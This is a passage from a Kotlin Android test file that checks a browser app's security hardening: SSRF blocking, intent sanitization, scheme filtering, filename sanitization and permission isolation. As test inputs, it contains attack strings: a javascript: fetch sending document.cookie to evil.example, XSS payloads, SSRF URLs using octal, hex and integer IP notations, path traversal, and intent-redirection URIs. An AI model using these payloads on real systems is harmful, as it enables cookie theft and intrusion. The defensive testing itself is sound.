        // 4. Host matching must not be bypassed by query-string/path substring spoofing
        val scopedExt = com.example.manager.BrowserExtension(
            name = "YouTube Scoped Extension",
            jsCode = "console.log(1);",
            matches = listOf("youtube.com")
        )
        assertTrue("Exact domain must match", mgr.doesExtensionMatchUrl(scopedExt, "https://youtube.com/watch?v=123"))
        assertTrue("Subdomain must match", mgr.doesExtensionMatchUrl(scopedExt, "https://m.youtube.com/watch?v=123"))
        assertFalse(
            "Attacker domain with youtube.com in query string must NOT match",
            mgr.doesExtensionMatchUrl(scopedExt, "https://evil-phishing.com/login?next=https://youtube.com")
        )
        assertFalse(
            "Attacker domain with youtube.com in path must NOT match",
            mgr.doesExtensionMatchUrl(scopedExt, "https://evil-phishing.com/youtube.com/index.html")
        )
    }

    @Test
    fun testFilterListHardeningAndExternalIntentValidation() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val filterMgr = com.example.manager.FilterListManager
        val secGuard = com.example.manager.SecurityGuardEngine
        val searchMgr = com.example.manager.SearchEngineManager

        // 1. FilterListManager HTTPS-only & SSRF protection
        assertTrue(
            "Public HTTPS filter list URL must be accepted",
            filterMgr.isSafeFilterListUrl("https://easylist.to/easylist/easylist.txt", resolveDns = false)
        )
        assertFalse(
            "Cleartext HTTP filter list URL must be rejected",
            filterMgr.isSafeFilterListUrl("http://easylist.to/easylist/easylist.txt", resolveDns = false)
        )
        assertFalse(
            "Loopback filter list URL must be rejected",
            filterMgr.isSafeFilterListUrl("https://localhost/easylist.txt", resolveDns = false)
        )
        assertFalse(
            "Private IP filter list URL must be rejected",
            filterMgr.isSafeFilterListUrl("https://192.168.1.1/easylist.txt", resolveDns = true)
        )
        assertFalse(
            "Loopback 127.0.0.1 filter list URL must be rejected",
            filterMgr.isSafeFilterListUrl("https://127.0.0.1/easylist.txt", resolveDns = true)
        )

        // 2. FilterListManager bounded stream reading & rule parsing
        val smallStream = "||doubleclick.net^\n||ads.example.com/banner(1)+*.js\$script,third-party\n/(a+)+$/".byteInputStream(Charsets.UTF_8)
        val rawRules = filterMgr.readBoundedUtf8Stream(smallStream, maxBytes = 4096)
        assertNotNull(rawRules)
        val parsed = filterMgr.parseRules(rawRules!!)
        assertTrue("Exact domain rule must be parsed", parsed.blockDomains.contains("doubleclick.net"))
        assertTrue("Rule set must block exact domain", parsed.ruleSet.isDomainBlocked("doubleclick.net"))
        val overLimitStream = ByteArray(2048) { 'x'.code.toByte() }.inputStream()
        assertNull(
            "Stream exceeding maxBytes must return null cleanly",
            filterMgr.readBoundedUtf8Stream(overLimitStream, maxBytes = 1024)
        )

        // 3. SearchEngineManager dangerous scheme blocking (prevents Self-XSS and file:// / content:// navigation)
        val jsQuery = searchMgr.parseUrlOrQuery("javascript:alert(document.cookie)", com.example.manager.SearchEngine.GOOGLE)
        assertTrue("javascript: input must be converted to search query, never raw scheme", jsQuery.startsWith("https://www.google.com/search?q="))
        val fileQuery = searchMgr.parseUrlOrQuery("file:///data/data/com.example/shared_prefs/prefs.xml", com.example.manager.SearchEngine.GOOGLE)
        assertTrue("file:// input must be converted to search query", fileQuery.startsWith("https://www.google.com/search?q="))
        val contentQuery = searchMgr.parseUrlOrQuery("content://${context.packageName}.fileprovider/downloads/a.txt", com.example.manager.SearchEngine.GOOGLE)
        assertTrue("content:// input must be converted to search query", contentQuery.startsWith("https://www.google.com/search?q="))

        // 4. External Intent sanitization (OWASP MASVS Intent Redirection & Confused Deputy defense)
        val maliciousIntentUri = "intent://evil#Intent;action=android.intent.action.DELETE;component=${context.packageName}/.MainActivity;i.flags=3;end"
        val sanitizedIntent = secGuard.buildSafeExternalIntent(context, maliciousIntentUri)
        assertNotNull(sanitizedIntent)
        assertEquals("Action must be forced to ACTION_VIEW", android.content.Intent.ACTION_VIEW, sanitizedIntent!!.action)
        assertNull("Component must be stripped to null", sanitizedIntent.component)
        assertNull("Selector must be stripped to null", sanitizedIntent.selector)
        assertEquals(
            "URI read/write permission flags must be stripped",
            0,
            sanitizedIntent.flags and (android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION or android.content.Intent.FLAG_GRANT_WRITE_URI_PERMISSION)
        )

        val selfTargetIntentUri = "intent://open#Intent;package=${context.packageName};scheme=https;end"
        assertNull("Intent targeting own package must be rejected", secGuard.buildSafeExternalIntent(context, selfTargetIntentUri))

        val fileDataIntentUri = "intent:///data/data/secret#Intent;scheme=file;end"
        assertNull("Intent with embedded file:// scheme must be rejected", secGuard.buildSafeExternalIntent(context, fileDataIntentUri))

        // Safe vs unsafe browser_fallback_url extraction
        val safeFallbackIntent = "intent://scan/#Intent;scheme=zxing;S.browser_fallback_url=https%3A%2F%2Fexample.com%2Flanding;end"
        assertEquals("https://example.com/landing", secGuard.extractSafeFallbackUrl(safeFallbackIntent))
        val ssrfFallbackIntent = "intent://scan/#Intent;scheme=zxing;S.browser_fallback_url=http%3A%2F%2F127.0.0.1%3A9222%2Fjson;end"
        assertNull("Loopback SSRF fallback URL must be rejected", secGuard.extractSafeFallbackUrl(ssrfFallbackIntent))
        val jsFallbackIntent = "intent://scan/#Intent;scheme=zxing;S.browser_fallback_url=javascript%3Aalert(1);end"
        assertNull("javascript: fallback URL must be rejected", secGuard.extractSafeFallbackUrl(jsFallbackIntent))

        // 5. WebView FileChooser result URI validation (prevents internal file/ContentProvider theft)
        val cameraUri = Uri.parse("content://${context.packageName}.fileprovider/camera_captures/captured_1.jpg")
        assertTrue(
            "Explicitly created camera capture URI for current session must be allowed",
            secGuard.isSafeFileChooserResultUri(context, cameraUri, allowedCameraUri = cameraUri)
        )
        assertFalse(
            "Internal FileProvider URI not matching active camera capture must be blocked",
            secGuard.isSafeFileChooserResultUri(
                context,
                Uri.parse("content://${context.packageName}.fileprovider/downloads/secret.pdf"),
                allowedCameraUri = cameraUri
            )
        )
        assertFalse(
            "file:// URI returned to FileChooser must be blocked",
            secGuard.isSafeFileChooserResultUri(
                context,
                Uri.parse("file:///data/data/${context.packageName}/databases/browser_database"),
                allowedCameraUri = null
            )
        )
        assertTrue(
            "External system MediaStore content:// URI must be allowed",
            secGuard.isSafeFileChooserResultUri(
                context,
                Uri.parse("content://com.android.providers.media.documents/document/image%3A1024"),
                allowedCameraUri = null
            )
        )
        assertFalse(
            "Encoded path traversal %2e%2e in FileChooser content:// URI must be blocked",
            secGuard.isSafeFileChooserResultUri(
                context,
                Uri.parse("content://com.thirdparty.picker/files/%2e%2e/%2e%2e/data/data/${context.packageName}/shared_prefs/prefs.xml"),
                allowedCameraUri = null
            )
        )
        assertFalse(
            "Content URI pointing into app_webview or /data/user/0/<pkg> must be blocked",
            secGuard.isSafeFileChooserResultUri(
                context,
                Uri.parse("content://com.thirdparty.picker/root/data/user/0/${context.packageName}/app_webview/Default/Cookies"),
                allowedCameraUri = null
            )
        )

        // 6. Web Navigation URL validation (Tahap 2: blocks javascript:, file:, content:, data:, intent: in JS Bridge & Context Menu)
        assertTrue(
            "Standard https:// URL must be accepted for web navigation",
            secGuard.isSafeWebNavigationUrl("https://example.com/article?id=42")
        )
        assertTrue(
            "Standard http:// URL must be accepted for web navigation",
            secGuard.isSafeWebNavigationUrl("http://example.com/page")
        )
        assertFalse(
            "javascript: scheme must be rejected for web navigation",
            secGuard.isSafeWebNavigationUrl("javascript:alert(document.domain)")
        )
        assertFalse(
            "file:// scheme must be rejected for web navigation",
            secGuard.isSafeWebNavigationUrl("file:///android_asset/secret.html")
        )
        assertFalse(
            "content:// scheme must be rejected for web navigation",
            secGuard.isSafeWebNavigationUrl("content://${context.packageName}.fileprovider/downloads/a.pdf")
        )
        assertFalse(
            "data: scheme must be rejected for web navigation",
            secGuard.isSafeWebNavigationUrl("data:text/html,<script>alert(1)</script>")
        )
        assertFalse(
            "intent:// scheme must be rejected for direct web navigation",
            secGuard.isSafeWebNavigationUrl("intent://example.com#Intent;scheme=https;end")
        )

        // 7. DevToolsJsBridge burst-throttling & payload bounds
        var consoleCount = 0
        var elementSelectCount = 0
        val devToolsBridge = com.example.devtools.DevToolsJsBridge(
            onElementSelected = { elementSelectCount++ },
            onConsoleBridgeMessage = { consoleCount++ }
        )
        for (i in 1..100) {
            devToolsBridge.onConsoleMessage("""{"level":"LOG","message":"msg-$i"}""")
        }
        assertEquals(
            "DevToolsJsBridge must cap console burst at 60 messages per second window",
            60,
            consoleCount
        )
        val validPayload = """{"tagName":"DIV","id":"hero","classes":["banner"],"textPreview":"Hello","rect":{"width":100,"height":50,"x":10,"y":20}}"""
        devToolsBridge.onElementSelected(validPayload)
        devToolsBridge.onElementSelected(validPayload) // immediate second call within 80ms cooldown
        assertEquals(
            "DevToolsJsBridge must rate-limit rapid onElementSelected calls within cooldown window",
            1,
            elementSelectCount
        )

        // 8. Tahap 3: AppDownloadManager SSRF, alternative IP notations, & data: URI bounds
        assertTrue(
            "Public HTTPS download URL must be accepted",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("https://releases.example.com/app-v1.apk", resolveDns = false)
        )
        assertTrue(
            "Bounded data: URI must be accepted",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==", resolveDns = false)
        )
        assertFalse(
            "Malformed data: URI without comma must be rejected",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("data:image/png;base64", resolveDns = false)
        )
        assertFalse(
            "Loopback 127.0.0.1 download URL must be rejected",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("http://127.0.0.1:8080/secret", resolveDns = true)
        )
        assertFalse(
            "Cloud metadata 169.254.169.254 download URL must be rejected",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("http://169.254.169.254/latest/meta-data/", resolveDns = false)
        )
        assertFalse(
            "Carrier-Grade NAT 100.64.0.1 download URL must be rejected",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("http://100.64.0.1/internal", resolveDns = false)
        )
        assertFalse(
            "Octal IP notation 0177.0.0.1 must be rejected",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("http://0177.0.0.1/secret", resolveDns = false)
        )
        assertFalse(
            "Single-integer IP notation 2130706433 must be rejected",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("http://2130706433/secret", resolveDns = false)
        )
        assertFalse(
            "Hex IP notation 0x7f000001 must be rejected",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("http://0x7f000001/secret", resolveDns = false)
        )

        // 9. Tahap 3: Filename sanitization (path traversal + Unicode RLO extension spoofing defense)
        val traversalSanitized = com.example.manager.AppDownloadManager.sanitizeFileName("../../%2e%2e%2fshared_prefs/secret.xml")
        assertFalse("Sanitized filename must not contain '..'", traversalSanitized.contains(".."))
        assertFalse("Sanitized filename must not contain '/'", traversalSanitized.contains("/"))

        val rloSpoofName = "invoice_\u202Efdp.apk"
        val rloSanitized = com.example.manager.AppDownloadManager.sanitizeFileName(rloSpoofName)
        assertFalse("Unicode RLO character \\u202E must be stripped from filename", rloSanitized.contains('\u202E'))
        assertEquals("invoice_fdp.apk", rloSanitized)

        // 10. Tahap 3: FilterListManager restricted IP address verification
        assertTrue(
            "CGNAT 100.64.0.1 must be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("100.64.0.1"))
        )
        assertTrue(
            "IPv6 Unique Local fd00::1 must be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("fd00::1"))
        )
        assertTrue(
            "IPv4-mapped loopback ::ffff:127.0.0.1 must be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("::ffff:127.0.0.1"))
        )
        assertTrue(
            "IPv4-mapped RFC1918 ::ffff:10.0.0.1 must be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("::ffff:10.0.0.1"))
        )
        assertTrue(
            "IPv4-mapped RFC1918 ::ffff:192.168.1.1 must be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("::ffff:192.168.1.1"))
        )
        assertTrue(
            "RFC1918 10.10.10.10 must be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("10.10.10.10"))
        )
        assertTrue(
            "RFC1918 172.20.0.1 must be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("172.20.0.1"))
        )
        assertTrue(
            "RFC1918 192.168.1.254 must be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("192.168.1.254"))
        )
        assertFalse(
            "Public IPv6 2606:4700:4700::1111 must not be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("2606:4700:4700::1111"))
        )
    }

    @Test
    fun testAlexBrowserNativeSecurityAndZapperSanitization() {
        val secGuard = com.example.manager.SecurityGuardEngine

        // 1. Phishing threat inspection for openUrlInNewTab
        val phishingThreat = secGuard.inspectUrlThreat(
            url = "https://secure-login-verify.xyz/login",
            httpsOnlyEnabled = true,
            phishingProtectionEnabled = true,
            isUserTrustedHost = false
        )
        assertTrue(
            "Phishing domain must be detected as threat",
            phishingThreat.severity == com.example.manager.ThreatSeverity.SUSPICIOUS_PHISHING ||
            phishingThreat.severity == com.example.manager.ThreatSeverity.MALWARE_OR_SCAM
        )

        // 2. Safe domain passes threat inspection
        val safeThreat = secGuard.inspectUrlThreat(
            url = "https://github.com/AlexHutajulu",
            httpsOnlyEnabled = true,
            phishingProtectionEnabled = true,
            isUserTrustedHost = false
        )
        assertEquals(com.example.manager.ThreatSeverity.SAFE, safeThreat.severity)

        // 3. CSS Zapper selector breakout attempts must be neutralized
        val dangerousSelectors = listOf(
            "div { display: none } body",
            "img; background: url('https://evil.com')",
            "<script>alert(1)</script>",
            "div\n@import url('https://evil.com')",
            "a > b"
        )
        for (ds in dangerousSelectors) {
            val sanitized = if (ds.contains('{') || ds.contains('}') || ds.contains(';') ||
                ds.contains('<') || ds.contains('>') || ds.contains('@') ||
                ds.contains('\n') || ds.contains('\r')
            ) "" else ds.trim().take(160)
            assertEquals("CSS injection character in '$ds' must result in empty sanitized selector", "", sanitized)
        }
    }

    @Test
    fun testPrivateTabIsolationAndEncryptedStorageMigration() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val settings = com.example.manager.SettingsManager(context)

        // 1. Verify private tabs are never persisted by saveTabs/loadTabs
        val mixedTabs = listOf(
            com.example.ui.viewmodel.BrowserTab(
                id = "normal-1",
                url = "https://example.com/normal",
                title = "Normal Page",
                isPrivate = false
            ),
            com.example.ui.viewmodel.BrowserTab(
                id = "private-1",
                url = "https://secret.example.com/private",
                title = "Secret Private Page",
                isPrivate = true
            )
        )
        settings.saveTabs(mixedTabs, "private-1")
        val loaded = settings.loadTabs()
        assertNotNull("Loaded tabs must not be null", loaded)
        assertEquals("Only normal tabs must be persisted to storage", 1, loaded!!.size)
        assertEquals("normal-1", loaded[0].id)
        assertFalse("Loaded tab must never be marked private", loaded[0].isPrivate)

        // 2. Verify legacy plaintext preference migration preserves data and clears legacy store
        val legacyPrefs = context.getSharedPreferences("alex_browser_prefs", android.content.Context.MODE_PRIVATE)
        legacyPrefs.edit().putString("legacy_test_key_tahap5", "migrated_value_123").commit()
        val targetPrefs = com.example.manager.EncryptedPreferencesManager.getPreferences(context)
        targetPrefs.edit().putBoolean("__legacy_prefs_migrated_v1__", false).commit()

        com.example.manager.EncryptedPreferencesManager.migrateLegacyPreferencesIfNeeded(context, targetPrefs)
        assertEquals(
            "Legacy preference must be migrated to EncryptedPreferencesManager",
            "migrated_value_123",
            targetPrefs.getString("legacy_test_key_tahap5", null)
        )
        assertFalse(
            "Legacy plaintext preference store must be cleared after migration",
            legacyPrefs.contains("legacy_test_key_tahap5")
        )

        // 3. Verify Incognito downloads isolation & cleanup in Room DB
        val db = com.example.data.AppDatabase.getDatabase(context)
        val downloadRepo = com.example.data.DownloadRepository(db.downloadDao())
        kotlinx.coroutines.runBlocking {
            downloadRepo.clearAll()
            downloadRepo.insertOrUpdate(
                com.example.data.DownloadItem(
                    id = "dl-normal-1",
                    fileName = "report.pdf",
                    url = "https://example.com/report.pdf",
                    domain = "example.com",
                    mimeType = "application/pdf",
                    totalBytes = 500L,
                    downloadedBytes = 500L,
                    status = "COMPLETED",
                    fileUri = "/tmp/report.pdf",
                    isIncognito = false
                )
            )
            downloadRepo.insertOrUpdate(
                com.example.data.DownloadItem(
                    id = "dl-priv-1",
                    fileName = "private_doc.pdf",
                    url = "https://secret.example.com/private_doc.pdf",
                    domain = "secret.example.com",
                    mimeType = "application/pdf",
                    totalBytes = 800L,
                    downloadedBytes = 800L,
                    status = "COMPLETED",
                    fileUri = "/tmp/private_doc.pdf",
                    isIncognito = true
                )
            )

            // Non-incognito query must never expose incognito download
            val visibleNormal = downloadRepo.nonIncognitoDownloads.first()
            assertEquals("Non-incognito query must only return normal downloads", 1, visibleNormal.size)
            assertEquals("dl-normal-1", visibleNormal[0].id)

            // Clearing incognito downloads must remove only incognito records and preserve normal records
            downloadRepo.clearIncognito()
            val allAfterClear = downloadRepo.allDownloads.first()
            assertEquals("Only normal download must remain after clearIncognito()", 1, allAfterClear.size)
            assertEquals("dl-normal-1", allAfterClear[0].id)
        }
    }

    @Test
    fun testTahap6TrackerConsistencyCosmeticSafetyAndUnifiedLogs() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val webView = WebView(context)
        val client = AdBlockWebViewClient(PrivacyMode.BALANCED)
        client.updateCurrentPageUrl("https://news.example.com/article")

        val adReq = createRequest("https://doubleclick.net/pagead/ads.js")
        val trackerReq = createRequest("https://hotjar.com/track.js")
        val trackerPathReq = createRequest("https://stats.thirdparty.example/google-analytics.com/collect?v=1")

        // 1. BALANCED mode with trackerBlockingEnabled = false: ads blocked, trackers allowed
        client.setTrackerBlockingEnabled(enabled = false, activeWhenAdBlockOff = true)
        assertNotNull("Ad domain must still be blocked in BALANCED mode when tracker blocking is off", client.shouldInterceptRequest(webView, adReq))
        assertNull("Tracker domain must be allowed when trackerBlockingEnabled is false", client.shouldInterceptRequest(webView, trackerReq))
        assertNull("Tracker path must be allowed when trackerBlockingEnabled is false", client.shouldInterceptRequest(webView, trackerPathReq))

        // 2. OFF mode with trackerBlockingEnabled = true (activeWhenAdBlockOff = true): ads allowed, trackers blocked
        client.setMode(PrivacyMode.OFF)
        client.setTrackerBlockingEnabled(enabled = true, activeWhenAdBlockOff = true)
        assertNull("Ad domain must be allowed when AdBlock mode is OFF", client.shouldInterceptRequest(webView, adReq))
        assertNotNull("Tracker domain must be blocked when trackerBlockingEnabled is true even if AdBlock is OFF", client.shouldInterceptRequest(webView, trackerReq))
        assertNotNull("Tracker path must be blocked when trackerBlockingEnabled is true even if AdBlock is OFF", client.shouldInterceptRequest(webView, trackerPathReq))

        // 3. Streaming Boost protects video segments (.m3u8 / .mp4)
        client.setMode(PrivacyMode.BALANCED)
        val streamSegmentOnAdHost = createRequest("https://doubleclick.net/video/segment1.m3u8")
        client.setStreamingBoostEnabled(false)
        assertNotNull("Ad domain stream segment blocked when streamingBoost is false", client.shouldInterceptRequest(webView, streamSegmentOnAdHost))
        client.setStreamingBoostEnabled(true)
        assertNull("Streaming Boost must protect .m3u8 segments from blocking", client.shouldInterceptRequest(webView, streamSegmentOnAdHost))

        // 4. CosmeticFilterInjector selector safety and critical domain bypass
        assertTrue(com.example.manager.CosmeticFilterInjector.isSafeCssSelector(".ad-banner"))
        assertTrue(com.example.manager.CosmeticFilterInjector.isSafeCssSelector("div[data-ad-slot='top']"))
        assertFalse(com.example.manager.CosmeticFilterInjector.isSafeCssSelector("body"))
        assertFalse(com.example.manager.CosmeticFilterInjector.isSafeCssSelector(".modal"))
        assertFalse(com.example.manager.CosmeticFilterInjector.isSafeCssSelector(".ad-banner { background: url(javascript:alert(1)) }"))
        assertFalse(com.example.manager.CosmeticFilterInjector.isSafeCssSelector(".ad-banner /* broken comment"))
        assertFalse(com.example.manager.CosmeticFilterInjector.isSafeCssSelector("div[data-ad='unbalanced]"))
        assertTrue(client.isCriticalBypassDomain("accounts.google.com"))
        assertTrue(client.isCriticalBypassDomain("challenges.cloudflare.com"))
        assertTrue(client.isCriticalBypassDomain("snap.midtrans.com"))

        // 5. Unified log store across AlexShieldV5LogStore and AdBlockEngine
        com.example.manager.AdBlockEngine.clearBlockedLogs()
        com.yourbrowser.adblock.AlexShieldV5LogStore.add(
            tabId = "tab-t6",
            pageUrl = "https://m.news.example.com/story/1",
            blockedUrl = "https://hotjar.com/script.js",
            reason = "tracker-domain"
        )
        val logs = com.example.manager.AdBlockEngine.getBlockedLogsForPage("https://www.news.example.com/")
        assertEquals("Unified log store must return subdomain-matched blocked log", 1, logs.size)
        assertEquals("Tracker", logs[0].type)
        assertEquals("hotjar.com", logs[0].host)
        com.example.manager.AdBlockEngine.clearBlockedLogs()
        assertTrue(com.example.manager.AdBlockEngine.getBlockedLogsForPage("https://news.example.com").isEmpty())
    }

    @Test
    fun testTahap7WebRtcExtensionsPermissionsAndSecurityHardening() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()

        // 1. PermissionManager W3C Secure Context enforcement & origin normalization
        val permMgr = com.example.manager.PermissionManager(context)
        permMgr.clearAllPermissions()

        assertTrue(
            "HTTPS origin must be eligible for CAMERA",
            com.example.manager.PermissionManager.isOriginEligibleForPermission(
                "https://meet.example.com/room",
                com.example.manager.SitePermissionType.CAMERA
            )
        )
        assertTrue(
            "Loopback http://localhost must be eligible for CAMERA",
            com.example.manager.PermissionManager.isOriginEligibleForPermission(
                "http://localhost:8080/test",
                com.example.manager.SitePermissionType.CAMERA
            )
        )
        assertFalse(
            "Insecure HTTP remote origin must NOT be eligible for CAMERA/MICROPHONE/LOCATION",
            com.example.manager.PermissionManager.isOriginEligibleForPermission(
                "http://insecure.example.com/cam",
                com.example.manager.SitePermissionType.CAMERA
            )
        )
        assertFalse(
            "file:// and javascript: origins must NOT be eligible for site permissions",
            com.example.manager.PermissionManager.isOriginEligibleForPermission(
                "file:///data/local/tmp/test.html",
                com.example.manager.SitePermissionType.LOCATION
            )
        )

        // Setting ALLOW on insecure HTTP origin must be rejected and return BLOCK
        permMgr.setWebsitePermission(
            "http://insecure.example.com",
            com.example.manager.SitePermissionType.MICROPHONE,
            com.example.manager.PermissionState.ALLOW
        )
        assertEquals(
            "Insecure HTTP origin must return BLOCK even after attempted ALLOW",
            com.example.manager.PermissionState.BLOCK,
            permMgr.getWebsitePermission("http://insecure.example.com", com.example.manager.SitePermissionType.MICROPHONE)
        )

        // Setting ALLOW on HTTPS origin must NOT leak to HTTP on the same hostname
        permMgr.setWebsitePermission(
            "https://secure.example.com/call",
            com.example.manager.SitePermissionType.CAMERA,
            com.example.manager.PermissionState.ALLOW
        )
        assertEquals(
            com.example.manager.PermissionState.ALLOW,
            permMgr.getWebsitePermission("https://secure.example.com", com.example.manager.SitePermissionType.CAMERA)
        )
        assertEquals(
            "Plain HTTP on same hostname must NOT inherit HTTPS permission",
            com.example.manager.PermissionState.BLOCK,
            permMgr.getWebsitePermission("http://secure.example.com", com.example.manager.SitePermissionType.CAMERA)
        )

        // 2. PermissionManager namespace isolation: clearAllPermissions() must NOT wipe SettingsManager or CustomJsToolbarManager
        val settings = com.example.manager.SettingsManager(context)
        settings.selectedSearchEngine = "DuckDuckGo"
        permMgr.clearAllPermissions()
        assertTrue("All site permissions must be cleared", permMgr.getAllPermissions().isEmpty())
        assertEquals(
            "clearAllPermissions() must preserve global encrypted settings",
            "DuckDuckGo",
            settings.selectedSearchEngine
        )

        // 3. Incognito permission isolation in BrowserViewModel
        val vm = com.example.ui.viewmodel.BrowserViewModel(context as android.app.Application)
        vm.handlePermissionChoice(
            "https://incognito-site.example.com",
            com.example.manager.SitePermissionType.CAMERA,
            com.example.manager.PermissionState.ALLOW,
            isIncognito = true
        )
        assertEquals(
            "Incognito permission choice must NEVER be persisted to PermissionManager",
            com.example.manager.PermissionState.ASK,
            permMgr.getWebsitePermission("https://incognito-site.example.com", com.example.manager.SitePermissionType.CAMERA)
        )

        // 4. WebRTC leak protection script verification (Strict & Compatibility modes)
        val strictScript = com.example.manager.SecurityGuardEngine.buildWebRtcProtectionScript(
            preventWebRtcLeak = true,
            strictWebRtcMode = true
        )
        assertTrue("Strict WebRTC script must lock RTCPeerConnection", strictScript.contains("RTCPeerConnection"))
        assertTrue("Strict WebRTC script must lock webkitRTCPeerConnection", strictScript.contains("webkitRTCPeerConnection"))

        val compatScript = com.example.manager.SecurityGuardEngine.buildWebRtcProtectionScript(
            preventWebRtcLeak = true,
            strictWebRtcMode = false
        )
        assertTrue("Compat WebRTC script must wrap webkitRTCPeerConnection", compatScript.contains("webkitRTCPeerConnection"))
        assertTrue("Compat WebRTC script must scrub IPv6 link-local/ULA and typ host", compatScript.contains("fe80") && compatScript.contains("typ\\s+host"))
        assertTrue("Compat WebRTC script must filter icecandidate event listeners", compatScript.contains("addEventListener") && compatScript.contains("onicecandidate"))

        // 5. Session-scoped temporary host bypass & critical domain protection for extensions / auto-scripts
        com.example.manager.SecurityGuardEngine.clearTemporaryBypasses()
        com.example.manager.SecurityGuardEngine.allowHostTemporarily(context, "temp-bypass.example.com", persist = false)
        assertTrue(com.example.manager.SecurityGuardEngine.isHostUserTrusted(context, "temp-bypass.example.com"))
        com.example.manager.SecurityGuardEngine.clearTemporaryBypasses()
        assertFalse(
            "Temporary session bypass must be cleared on clearTemporaryBypasses() and not persisted to disk",
            com.example.manager.SecurityGuardEngine.isHostUserTrusted(context, "temp-bypass.example.com")
        )

        val autoExt = com.example.manager.BrowserExtension(
            id = "ext_test_auto",
            name = "Auto Extension",
            jsCode = "console.log('hi');",
            matches = listOf("*"),
            runAt = com.example.manager.ExtensionRunAt.DOCUMENT_END,
            isEnabled = true
        )
        assertTrue(
            "Auto extension must be allowed on regular HTTPS site",
            com.example.manager.BrowserExtensionManager.canAutoInjectExtensionOnUrl(autoExt, "https://news.ycombinator.com")
        )
        assertFalse(
            "Auto extension must be blocked on critical banking/auth domains",
            com.example.manager.BrowserExtensionManager.canAutoInjectExtensionOnUrl(autoExt, "https://klikbca.com/login")
        )
        assertFalse(
            "Auto extension must be blocked on Google OAuth domain",
            com.example.manager.BrowserExtensionManager.canAutoInjectExtensionOnUrl(autoExt, "https://accounts.google.com/signin")
        )
        assertFalse(
            "Extension must never match non-HTTP(S) schemes",
            com.example.manager.BrowserExtensionManager.doesExtensionMatchUrl(autoExt, "file:///sdcard/secret.html")
        )

        val disabledAutoScript = com.example.manager.CustomToolbarScript(
            id = "js_disabled",
            name = "Disabled Auto Script",
            jsCode = "console.log(1);",
            autoRunMode = com.example.manager.JsAutoRunMode.ALL_SITES,
            isEnabled = false
        )
        val enabledAutoScript = disabledAutoScript.copy(id = "js_enabled", isEnabled = true)
        assertFalse(
            "Disabled auto-run script must NOT execute",
            com.example.manager.CustomJsToolbarManager.canAutoRunScriptOnUrl(disabledAutoScript, "https://example.com")
        )
        assertTrue(
            "Enabled auto-run script must execute on normal HTTPS site",
            com.example.manager.CustomJsToolbarManager.canAutoRunScriptOnUrl(enabledAutoScript, "https://example.com")
        )
        assertFalse(
            "Enabled auto-run script must be blocked on critical banking/payment domains",
            com.example.manager.CustomJsToolbarManager.canAutoRunScriptOnUrl(enabledAutoScript, "https://ibank.bca.co.id")
        )

        // 6. Verify built-in reader & image extractor templates do not use unsafe innerHTML concatenation
        val cleanReaderExt = com.example.manager.BrowserExtensionManager.BUILT_IN_EXTENSIONS.first { it.id == "ext_clean_reader" }
        assertTrue("Clean Reader extension must use DOMParser sanitization", cleanReaderExt.jsCode.contains("DOMParser"))
        assertFalse("Clean Reader extension must not copy raw target.innerHTML directly", cleanReaderExt.jsCode.contains("contentBox.innerHTML = target.innerHTML"))

        val imgExtractorTpl = com.example.manager.CustomJsToolbarManager.TEMPLATE_GALLERY.first { it.id == "tpl_image_extractor" }
        assertFalse("Image extractor template must not concatenate unescaped URLs into innerHTML", imgExtractorTpl.jsCode.contains("box.innerHTML ="))
    }

    @Test
    fun testTahap8EndToEndSecurityRegressionAndProductionReadiness() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()

        // 1. End-to-End URL, External Intent, & FileChooser Security Gate (Tahap 2)
        val secGuard = com.example.manager.SecurityGuardEngine
        assertTrue(secGuard.isSafeWebNavigationUrl("https://www.google.com/search?q=alexbrowser"))
        assertFalse(secGuard.isSafeWebNavigationUrl("javascript:fetch('https://evil.example/steal?c='+document.cookie)"))
        assertFalse(secGuard.isSafeWebNavigationUrl("file:///data/data/com.example/shared_prefs/secret.xml"))
        assertFalse(secGuard.isSafeWebNavigationUrl("content://${context.packageName}.fileprovider/downloads/secret.apk"))

        val safeIntent = secGuard.buildSafeExternalIntent(
            context,
            "intent://example.com#Intent;scheme=https;component=${context.packageName}/.MainActivity;i.flags=3;end"
        )
        assertNotNull("Valid external https intent must be sanitized, not null", safeIntent)
        assertNull("Explicit component targeting must be stripped", safeIntent!!.component)
        assertEquals(
            "URI grant flags must be stripped from external intent",
            0,
            safeIntent.flags and (android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION or android.content.Intent.FLAG_GRANT_WRITE_URI_PERMISSION)
        )

        // 2. Download SSRF, Path Traversal & RLO Spoofing Gate (Tahap 2 & Tahap 3)
        assertFalse(
            "Cloud metadata SSRF 169.254.169.254 must be blocked",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("http://169.254.169.254/latest/meta-data/", resolveDns = false)
        )
        assertFalse(
            "Hex/Octal loopback bypass must be blocked",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("http://0x7f000001/secret", resolveDns = false)
        )
        val traversalSanitized = com.example.manager.AppDownloadManager.sanitizeFileName("../../../../data/data/com.example/shared_prefs/prefs.xml")
